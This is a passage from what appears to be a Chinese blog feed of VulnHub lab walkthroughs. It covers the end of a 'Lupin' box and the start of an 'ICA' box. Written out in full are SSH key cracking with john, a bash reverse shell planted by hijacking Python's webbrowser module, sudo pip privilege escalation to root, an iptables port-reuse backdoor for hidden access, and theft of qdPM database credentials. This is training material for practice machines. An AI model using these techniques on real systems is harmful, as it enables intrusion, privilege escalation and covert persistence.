&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;或者用ffuf的方法进行爆破目录&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ffuf -u &amp;quot;http://192.168.31.236/~secret/.FUZZ&amp;quot; -w /usr/share/seclists/Discovery/Web-&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content/directory-list-2.3-medium.txt - e .txt,.pub,.html,.cer,.pem,.der,.key&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-344.png&#34; width=&#34;600&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 获得关键网址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjM2L35zZWNyZXQvLm15c2VjcmV0LnR4dA==&#34;&gt;http://192.168.31.236/~secret/.mysecret.txt&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;cyberchef-解密&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#cyberchef-解密&#34;&gt;#&lt;/a&gt; CyberChef 解密&lt;/h3&gt;
&lt;p&gt;访问该网址，得到了一串密码&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-345.png&#34; width=&#34;600&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;用 CyberChef 通过 magic 方法在线解密，得到是 base58 解密，复制解密代码&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-346.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;观察得到的密文，发现仍然是加密的！并不是真正的 ssh 私钥！&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-347.png&#34; width=&#34;470&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;john-破解私钥&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#john-破解私钥&#34;&gt;#&lt;/a&gt; john 破解私钥&lt;/h3&gt;
&lt;p&gt;采用 ssh2join.py 来破解 ssh 私钥，john 是一个破解系统密码的工具。&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;寻找 ssh2join.py 位置&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;使用locate sshjoin.py没有发现ssh2join.py文件&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;改用find / -name “ssh2john.py”&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;使用工具 ssh2john 转换为可以识别的信息&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python /usr/share/john/ssh2john.py ~/Desktop/tool/lupin/vulnhub_lupin &amp;gt; crack.txt&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-348.png&#34; width=&#34;600&#34; alt=&#34;Image&#34;&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;接下来要使用到上文所提示到的fastrack.txt文件&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;find / -name “fasttrack.txt”&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;john crack.txt --wordlist=/usr/share/wordlists/fasttrack.txt&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-349.png&#34; width=&#34;600&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 得到私钥文件的密码 P@55w0rd!&lt;/p&gt;
&lt;p&gt;指定私钥文件登陆对方服务器，选择密钥的密码为破解的密码&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ssh icex64@192.168.31.236 -i vulnhub_lupin&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-350.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;成功登陆到了服务器，并且有一个隐私设置问题&lt;/p&gt;
&lt;p&gt;-&amp;gt; 可以无密码调用 arsene 用户去执行这个文件&lt;/p&gt;
&lt;h3 id=&#34;py-依赖库修改&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#py-依赖库修改&#34;&gt;#&lt;/a&gt; py 依赖库修改&lt;/h3&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;直接将反弹shell的代码打印到此文件中&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo “bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.31.135/4444 0&amp;gt;&amp;amp;1” &amp;gt;&amp;gt; /home/arsene/heist.py&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-351.png&#34; width=&#34;600&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;没有权限去加载此 payload，翻阅目录，查找更多的敏感信息，发现这个文件里边有引入包 webbrower 这个操作，还有一份提示文件，这个提示文件就是说要运行此 python 文件&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;locate webbrowser寻找此文件 没有找到&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;find / -name “webbrowser”&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-352.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;将反弹shell的代码加载到此文件中&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;vim /usr/lib/python3.9/webbrowser.py&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;os.system(&amp;#x27;/usr/bin/bash /tmp/shell.sh&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;shell.sh内容如下&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat &amp;gt; /tmp/shell.sh &amp;lt;&amp;lt; EOF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;!/bin/bash&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.31.135/4444 0&amp;gt;&amp;amp;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;EOF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;chmod +x /tmp/shell.sh&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;调用 arsene 去执行该文件&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo -u arsene /usr/bin/python3.9 /home/arsene/heist.py&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-353.png&#34; width=&#34;570&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 监听 4444 ，并且拿到了 arsene 用户的 shell&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-354.png&#34; width=&#34;490&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;sudopip提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sudopip提权&#34;&gt;#&lt;/a&gt; sudo (pip) 提权&lt;/h3&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;查看权限设置问题&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo -l&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;pip提权&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;TF=$(mktemp -d)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo &amp;quot;import os; os.execl(&amp;#x27;/bin/sh&amp;#x27;, &amp;#x27;sh&amp;#x27;, &amp;#x27;-c&amp;#x27;, &amp;#x27;sh &amp;lt;$(tty) &amp;gt;$(tty) 2&amp;gt;$(tty)&amp;#x27;)&amp;quot; &amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;TF/setup.py&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo pip install $TF&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-355.png&#34; width=&#34;530&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 成功拿到 root 权限&lt;/p&gt;
&lt;h3 id=&#34;iptables-端口复用&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#iptables-端口复用&#34;&gt;#&lt;/a&gt; iptables 端口复用&lt;/h3&gt;
&lt;p&gt;这里不做权限维持，直接上的权限隐藏，注意攻击机是 192.168.31.237 靶机是 192.168.31.236&lt;/p&gt;
&lt;p&gt;在目标服务器上依次执行以下命令&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;创建端口复用链子：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;iptables -t nat -N MyChains&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;创建端口复用规则，访问192.168.3.6:80的流量转发至 22 端口：(如果要转发到其他ip机器，注意需要开启转发功能)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;iptables -t nat -A MyChains -p tcp -j REDIRECT --to-port 22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;设置开启开关，当接收到一个含有&lt;span class=&#34;string&#34;&gt;&amp;quot;nihao123coming&amp;quot;&lt;/span&gt;的TCP包，则将来源IP添加到MyChains的列表中&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;iptables -A INPUT -p tcp -m string --string &amp;quot;nihao123coming&amp;quot; --algo bm -m recent --&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set --name MyChains --rsource -j ACCEPT&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;设置关闭开关，如果接收到含有&lt;span class=&#34;string&#34;&gt;&amp;quot;nihao123leaving&amp;quot;&lt;/span&gt;的TCP包，则将来源IP从MyChains的列表中删除&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;iptables -A INPUT -p tcp -m string --string &amp;quot;nihao123leaving&amp;quot; --algo bm -m recent --&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;name MyChains --remove -j ACCEPT&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;当发现SYN包的来源IP处于MyChains的列表中，将跳转到MyChains链进行处理，有效时间为 3600 秒&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;iptables -t nat -A PREROUTING -p tcp --dport 80 --syn -m recent --rcheck --seconds&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3600 --name MyChains --rsource -j MyChains&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-356.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;攻击机上执行以下命令&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;开启复用，开启后发送开启命令的机器到目标 80 端口的流量将被转发到目标 20 端口&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;nc 192.168.3.6 80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;nihao123coming&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-357.png&#34; width=&#34;490&#34; alt=&#34;Image&#34;&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;ssh -p 80 icex64@192.168.31.236&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-358.png&#34; width=&#34;490&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;从攻击机连接目标机器的 80 端口成功，此时 80 的网站我们将无法访问&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-359.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;用其他 ip 访问此网站也是打不开的&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-360.png&#34; width=&#34;550&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;关闭复用&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;nc 192.168.3.236 80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;nihao123leaving&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ssh -p 80 icex64@192.168.31.236&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;将不能通过 80 连接，并且网站恢复正常&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-361.png&#34; width=&#34;400&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; iptables 端口复用成功，可在攻击机上执行 nc 192.168.3.236 80 即可来开启或者关闭对方的 80 网站，从而进入到目标主机&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://n1h1l157.github.io/2021/11/01/VULNHUB/114%20ICA/</guid>
            <title>VULNHUB 14 ICA</title>
            <link>https://n1h1l157.github.io/2021/11/01/VULNHUB/114%20ICA/</link>
            <category>VULNHUB 11-20</category>
            <pubDate>Mon, 01 Nov 2021 00:00:00 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;靶机下载地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvaWNhLTEsNzQ4Lw==&#34;&gt;https://www.vulnhub.com/entry/ica-1,748/&lt;/span&gt;&lt;br&gt;
 教程链接地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDgzMDY0NS9hcnRpY2xlL2RldGFpbHMvMTIzNTIwMTE4&#34;&gt;https://blog.csdn.net/weixin_44830645/article/details/123520118&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
&lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
 靶机 ICA：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
&lt;p&gt;1）arp 确定靶机地址&lt;br&gt;
 &lt;code&gt;sudo arp-scan -l&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-290.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 目标机器的 ip 地址： 192.168.31.50&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;确认靶机 ip 开放的端口信息&lt;br&gt;
 &lt;code&gt;sudo nmap -A -p- 192.168.31.50 -oN /tmp/ica.txt&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-291.png&#34; width=&#34;450&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机开放端口 21, 80, 8080&lt;/p&gt;
&lt;h3 id=&#34;qdpm92-漏洞寻找&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#qdpm92-漏洞寻找&#34;&gt;#&lt;/a&gt; qdpm9.2 漏洞寻找&lt;/h3&gt;
&lt;p&gt;1 ）打开网址 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNTA=&#34;&gt;http://192.168.31.50&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-292.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;发现版本号 qdpm9.2 直接搜索 exp&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-293.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;在 exploit-db 上找到了可以利用的 poc&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-294.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;访问网址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNTAvY29yZS9jb25maWcvZGF0YWJhc2VzLnltbA==&#34;&gt;http://192.168.31.50/core/config/databases.yml&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-295.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 得到数据库用户名：qdpmadmin 密码：UcVQCMQk2STVeS6J&lt;/p&gt;
&lt;h3 id=&#34;mysql-寻找敏感信息&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#mysql-寻找敏感信息&#34;&gt;#&lt;/a&gt; mysql 寻找敏感信息&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;mysql -h 192.168.31.50 -u qdpmadmin - p&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-296.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
